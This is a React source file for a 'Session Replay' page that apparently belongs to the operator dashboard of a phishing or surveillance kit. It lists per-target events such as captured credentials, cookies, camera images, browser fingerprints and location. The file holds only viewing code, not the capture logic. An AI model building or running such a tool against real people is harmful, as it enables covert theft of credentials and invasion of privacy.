import { useEffect, useState } from 'react'
import { api, EventRow, Session } from '../api/client'
import LoadMoreButton from '../components/LoadMoreButton'

function eventIcon(type: string) {
  const map: Record<string, string> = {
    page_visit: '🌐', location_granted: '📍', location_denied: '🚫',
    camera_capture: '📸', fingerprint_collected: '🔍',
    cross_session_match: '🔗', camera_granted: '📷', camera_denied: '🚫',
    storage_captured: '🍪', credentials_captured: '🔑',
  }
  return map[type] || '⚡'
}

export default function SessionReplay() {
  const [events, setEvents] = useState<EventRow[]>([])
  const [loading, setLoading] = useState(true)
  const [sessions, setSessions] = useState<Session[]>([])
  const params = new URLSearchParams(window.location.search)
  const [selectedSession, setSelectedSession] = useState(params.get('session') || 'default')
  const [error, setError] = useState<string | null>(null)
  const [expandedEvent, setExpandedEvent] = useState<string | null>(null)
  const [offset, setOffset] = useState(0)
  const [hasMore, setHasMore] = useState(true)
  const [loadingMore, setLoadingMore] = useState(false)
  const LIMIT = 200

  const refresh = async (append = false) => {
    try {
      setError(null)
      const session = selectedSession === 'default' ? '' : selectedSession
      const result = await api.events(session, append ? offset : 0, LIMIT)
      if (append) {
        setEvents(prev => [...prev, ...result.entries])
      } else {
        setEvents(result.entries)
        setOffset(0)
      }
      setHasMore(result.has_more)
    } catch (e) { setError(e instanceof Error ? e.message : 'Failed to load') }
    finally { setLoading(false); setLoadingMore(false) }
  }

  useEffect(() => {
    api.sessions().then(setSessions).catch(() => {})
  }, [])

  useEffect(() => {
    setEvents([])
    setOffset(0)
    setLoading(true)
    refresh()
    let cancelled = false
    const poll = async () => {
      if (cancelled) return
      setEvents(prev => prev.length > 0 ? prev : [])
      if (!cancelled) setTimeout(poll, 15000)
    }
    setTimeout(poll, 15000)
    return () => { cancelled = true }
  }, [selectedSession])

  const loadMore = async () => {
    setLoadingMore(true)
    const nextOffset = offset + LIMIT
    setOffset(nextOffset)
    await refresh(true)
  }

  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>

  if (error) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center space-y-3">
          <div className="text-4xl">⚠️</div>
          <p className="text-sm text-tertiary">{error}</p>
          <button onClick={() => { setLoading(true); refresh() }} className="px-4 py-2 text-sm accent-bg accent radius-sm">Retry</button>
        </div>
      </div>
    )
  }

  const sessionExists = sessions.some(s => s.id === selectedSession)

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-4 flex-wrap animate-fade-in">
        <h1 className="text-xl font-bold text-primary">Session Replay</h1>
        <select
          value={selectedSession}
          onChange={e => { setSelectedSession(e.target.value); setExpandedEvent(null) }}
          className="select-apple"
        >
          {sessions.map(s => (
            <option key={s.id} value={s.id}>{s.name || s.id}</option>
          ))}
        </select>
        {selectedSession !== 'default' && (
          <span className="text-[10px] text-tertiary mono bg-tertiary px-2 py-1 rounded">{selectedSession.substring(0, 20)}</span>
        )}
      </div>
      <p className="text-sm text-tertiary">{events.length} events</p>
      <div className="content-card !p-0 overflow-hidden max-h-[70vh] overflow-y-auto">
        {events.length === 0 && !loading ? (
          <div className="empty-state !py-16 animate-fade-in">
            <div className="icon !text-4xl">⚡</div>
            <h3>{sessionExists ? 'No events yet' : 'Session not found'}</h3>
            <p>{sessionExists ? 'Events appear as the target interacts with the page.' : 'Select an existing session from the dropdown above.'}</p>
          </div>
        ) : (
          <div className="p-1">
            {events.map((e, i) => {
              const isExpanded = expandedEvent === e.id
              const dataStr = e.event_data
                ? (typeof e.event_data === 'object' ? JSON.stringify(e.event_data, null, 2) : e.event_data)
                : null
              const isLong = dataStr && dataStr.length > 80
              return (
                <div key={e.id}>
                  <div className="flex items-center gap-3 px-4 py-2.5 border-b border-subtle text-sm animate-fade-in hover:bg-white/[0.02] cursor-pointer"
                    style={{ animationDelay: `${Math.min(i * 0.02, 0.5)}s` }}
                    onClick={() => isLong && setExpandedEvent(isExpanded ? null : e.id)}>
                    <span className="text-lg select-none">{eventIcon(e.event_type)}</span>
                    <span className="text-secondary font-medium shrink-0">{e.event_type.replace(/_/g, ' ')}</span>
                    {dataStr && (
                      <span className="text-xs text-tertiary mono truncate flex-1 min-w-0">
                        {isExpanded ? dataStr : dataStr.substring(0, 80)}{isLong && !isExpanded ? '…' : ''}
                      </span>
                    )}
                    <span className="text-xs text-tertiary ml-auto mono shrink-0">{new Date(e.created_at * 1000).toLocaleTimeString()}</span>
                  </div>
                </div>
              )
            })}
            <LoadMoreButton hasMore={hasMore} loading={loadingMore} onLoad={loadMore} />
          </div>
        )}
      </div>
    </div>
  )
}
